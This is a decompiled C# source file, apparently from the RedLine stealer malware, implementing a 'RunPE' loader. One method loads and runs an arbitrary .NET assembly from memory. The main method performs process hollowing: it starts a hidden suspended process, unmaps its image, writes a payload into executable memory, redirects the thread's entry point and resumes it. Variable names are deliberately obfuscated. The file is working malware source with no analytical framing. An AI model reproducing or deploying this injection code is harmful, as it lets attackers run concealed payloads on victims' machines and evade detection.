using RedLine.Logic.Helpers;
using RedLine.Models.RunPE;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace RedLine.Logic.RunPE
{
  public static class LoadExecutor
  {
    public static bool SelfExecute(byte[] array)
    {
      try
      {
        new Thread((ThreadStart) (() => Assembly.Load(array).EntryPoint.Invoke((object) null, new object[1]
        {
          (object) new string[0]
        }))).Start();
        return true;
      }
      catch
      {
        return false;
      }
    }

    public static unsafe bool Execute(LoadParams args)
    {
      bool isWow64 = false;
      PROCESS_INFORMATION lpProcesSystemNetCertPolicyValidationCallbackv = new PROCESS_INFORMATION();
      CONTEXT context = new CONTEXT()
      {
        ContextFlags = 1048603
      };
      IntPtr lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU;
      IMAGE_DOS_HEADER* imageDosHeaderPtr;
      IMAGE_NT_HEADERS* imageNtHeadersPtr;
      fixed (byte* numPtr = args.Body)
      {
        lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU = (IntPtr) ((void*) numPtr);
        imageDosHeaderPtr = (IMAGE_DOS_HEADER*) numPtr;
        imageNtHeadersPtr = (IMAGE_NT_HEADERS*) (numPtr + imageDosHeaderPtr->e_lfanew);
      }
      if (imageDosHeaderPtr->e_magic != (ushort) 23117 || imageNtHeadersPtr->Signature != 17744U || imageNtHeadersPtr->OptionalHeader.Magic != (ushort) 267)
        return false;
      Buffer.SetByte((Array) args.Body, 920, (byte) 2);
      STARTUPINFO lpStartupInfo = new STARTUPINFO();
      lpStartupInfo.cb = Marshal.SizeOf((object) lpStartupInfo);
      lpStartupInfo.wShowWindow = (short) 0;
      using (LibInvoker libInvoker1 = new LibInvoker("kernel32.dll"))
      {
        using (LibInvoker libInvoker2 = new LibInvoker("ntdll.dll"))
        {
          if (!libInvoker1.CastToDelegate<NativeDelegates.CreateProcessInternalWDelegate>("CreateProcessInternalW")(0U, (string) null, args.AppPath, IntPtr.Zero, IntPtr.Zero, false, 134217740U, IntPtr.Zero, Path.GetDirectoryName(Assembly.GetEntryAssembly().Location), ref lpStartupInfo, out lpProcesSystemNetCertPolicyValidationCallbackv, 0U))
          {
            if (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess != IntPtr.Zero && libInvoker1.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
            {
              int num1 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess) ? 1 : 0;
              int num2 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread) ? 1 : 0;
            }
            return false;
          }
          int num3 = libInvoker1.CastToDelegate<NativeDelegates.IsWow64ProcessDelegate>("IsWow64Process")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, ref isWow64) ? 1 : 0;
          IntPtr imageBase = (IntPtr) ((long) imageNtHeadersPtr->OptionalHeader.ImageBase);
          int num4 = (int) libInvoker2.CastToDelegate<NativeDelegates.NtUnmapViewOfSectionDelegate>("NtUnmapViewOfSection")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, imageBase);
          if (libInvoker1.CastToDelegate<NativeDelegates.VirtualAllocExDelegate>("VirtualAllocEx")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, imageBase, imageNtHeadersPtr->OptionalHeader.SizeOfImage, 12288U, 64U) == IntPtr.Zero && libInvoker1.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
          {
            int num1 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess) ? 1 : 0;
            int num2 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread) ? 1 : 0;
            return false;
          }
          if (!libInvoker1.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>("WriteProcessMemory")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, imageBase, lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU, imageNtHeadersPtr->OptionalHeader.SizeOfHeaders, IntPtr.Zero) && libInvoker1.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
          {
            int num1 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess) ? 1 : 0;
            int num2 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread) ? 1 : 0;
            return false;
          }
          for (ushort index = 0; (int) index < (int) imageNtHeadersPtr->FileHeader.NumberOfSections; ++index)
          {
            IMAGE_SECTION_HEADER* imageSectionHeaderPtr = (IMAGE_SECTION_HEADER*) ((ulong) lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU.ToInt64() + (ulong) imageDosHeaderPtr->e_lfanew + (ulong) Marshal.SizeOf(typeof (IMAGE_NT_HEADERS)) + (ulong) (Marshal.SizeOf(typeof (IMAGE_SECTION_HEADER)) * (int) index));
            if (!libInvoker1.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>("WriteProcessMemory")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, (IntPtr) (imageBase.ToInt64() + (long) imageSectionHeaderPtr->VirtualAddress), (IntPtr) (lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU.ToInt64() + (long) imageSectionHeaderPtr->PointerToRawData), imageSectionHeaderPtr->SizeOfRawData, IntPtr.Zero) && libInvoker1.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
            {
              int num1 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess) ? 1 : 0;
              int num2 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread) ? 1 : 0;
              return false;
            }
          }
          if (isWow64)
          {
            if (!libInvoker1.CastToDelegate<NativeDelegates.Wow64GetThreadContextDelegate>("Wow64GetThreadContext")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &context) && libInvoker1.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
            {
              int num1 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess) ? 1 : 0;
              int num2 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread) ? 1 : 0;
              return false;
            }
          }
          else if (!libInvoker1.CastToDelegate<NativeDelegates.Wow64GetThreadContextDelegate>("GetThreadContext")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &context) && libInvoker1.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
          {
            int num1 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess) ? 1 : 0;
            int num2 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread) ? 1 : 0;
            return false;
          }
          IntPtr num5 = Marshal.AllocHGlobal(8);
          ulong int64 = (ulong) imageBase.ToInt64();
          byte[] source = new byte[8];
          for (int index = 0; index < 8; ++index)
          {
            source[index] = (byte) (int64 >> index * 8);
            if (index == 7)
              Marshal.Copy(source, 0, num5, 8);
          }
          if (!libInvoker1.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>("WriteProcessMemory")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, (IntPtr) ((long) context.Ebx + 8L), num5, 4U, IntPtr.Zero))
          {
            Marshal.FreeHGlobal(num5);
            if (libInvoker1.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
            {
              int num1 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess) ? 1 : 0;
              int num2 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread) ? 1 : 0;
              return false;
            }
          }
          Marshal.FreeHGlobal(num5);
          context.Eax = (uint) ((ulong) imageBase.ToInt64() + (ulong) imageNtHeadersPtr->OptionalHeader.AddressOfEntryPoint);
          if (isWow64)
          {
            if (!libInvoker1.CastToDelegate<NativeDelegates.Wow64SetThreadContextDelegate>("Wow64SetThreadContext")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &context) && libInvoker1.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
            {
              int num1 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess) ? 1 : 0;
              int num2 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread) ? 1 : 0;
              return false;
            }
          }
          else if (!libInvoker1.CastToDelegate<NativeDelegates.Wow64SetThreadContextDelegate>("SetThreadContext")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &context) && libInvoker1.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
          {
            int num1 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess) ? 1 : 0;
            int num2 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread) ? 1 : 0;
            return false;
          }
          int num6 = (int) libInvoker1.CastToDelegate<NativeDelegates.ResumeThreadDelegate>("ResumeThread")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
          int num7 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess) ? 1 : 0;
          int num8 = libInvoker1.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")(lpProcesSystemNetCertPolicyValidationCallbackv.hThread) ? 1 : 0;
        }
      }
      return true;
    }
  }
}
